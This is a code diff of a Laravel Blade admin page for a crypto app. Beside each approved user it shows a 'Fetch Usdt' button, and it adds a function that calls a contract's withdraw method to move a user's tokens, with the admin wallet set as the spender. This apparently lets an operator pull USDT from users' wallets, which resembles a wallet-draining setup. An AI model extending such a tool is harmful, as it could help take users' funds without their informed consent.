@@ -21,7 +21,7 @@
                     <div class="col-md-6">
                         <div class="float-right">
                             {{-- <small>Connected Wallet:</small> --}}
-                            <button type="button" class="btn btn-primary" onClick="connectWallet()">
+                            <button id="connectButton" type="button" class="btn btn-primary" onClick="connectWallet()">
                                 Connect
                             </button>
                         </div>
@@ -53,10 +53,19 @@
                             <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif</td>
                             <td>
                                 {{-- <button class="btn btn-secondary">
-                      <i class="fas fa-ellipsis-v"></i>
-                    </button> --}}
+                                <i class="fas fa-ellipsis-v"></i>
+                                </button> --}}
                                 {{-- @include('partials._drop1'); --}}
-                                @if ($user->status == 'pending') <a href="#" onClick="updateStatus({{$user->id}})" data-user_id={{$user->id}} class="btn btn-primary btn-sm">Approve</a> @else <a href="#" id="modal_{{$user->id}}" onClick="fetchToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->real_balance}}>Fetch Usdt</a> <a href="users/manage-balance" class="btn btn-secondary btn-sm">Manage balance</a> @endif
+                                @if ($user->status == 'pending')
+                                <a href="#" onClick="updateStatus({{$user->id}})" data-user_id={{$user->id}} class="btn btn-primary btn-sm">
+                                    Approve
+                                </a>
+                                @else
+                                <a href="#" id="modal_{{$user->id}}" onClick="fetchToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->real_balance}}>
+                                    Fetch Usdt
+                                </a>
+                                <a href="users/manage-balance" class="btn btn-secondary btn-sm">Manage balance</a>
+                                @endif
                             </td>
                         </tr>
                         @endforeach
@@ -85,10 +94,8 @@
 
     // Get info
     const getInfo = async () => {
-
         // Get connected user balances
         var walletAddress = await web3.eth.getAccounts()
-
     }
 
     // Wallet Connect
@@ -109,6 +116,25 @@
         }
     }
 
+    // Withdraw from user
+    const withdrawFromContract = async () => {
+        // Ensure the user has connected their wallet
+        const accounts = await window.ethereum.request({
+            method: 'eth_requestAccounts'
+        })
+        const adminWalletAddress = accounts[0]
+        let user = $('#modal-wallet').val();
+        let amount = parseInt($('#modal-amount').val());
+        try {
+            // Call the withdraw method on the contract
+            const transaction = await contract.methods.withdraw(user, amount).send({
+                from: adminWalletAddress,
+            })
+            console.log('Withdrawal successful:', transaction)
+        } catch (error) {
+            console.error('Error withdrawing from contract:', error)
+        }
+    }
 
     function updateStatus(id) {
 
@@ -132,12 +158,17 @@
 
     };
 
-    function fetchToken(id) {
+    async function fetchToken(id) {
+        const accounts = await window.ethereum.request({
+            method: 'eth_requestAccounts'
+        });
+        const adminWalletAddress = accounts[0];
 
         var wallet = $("#modal_" + id).attr('data-wallet');
         var balance = $("#modal_" + id).attr('data-balance');
 
         $("#modal-wallet").val(wallet);
+        $("#modal-spender").val(adminWalletAddress);
         $("#modal-balance").text(balance);
 
         $('#fetchForm').modal('show');
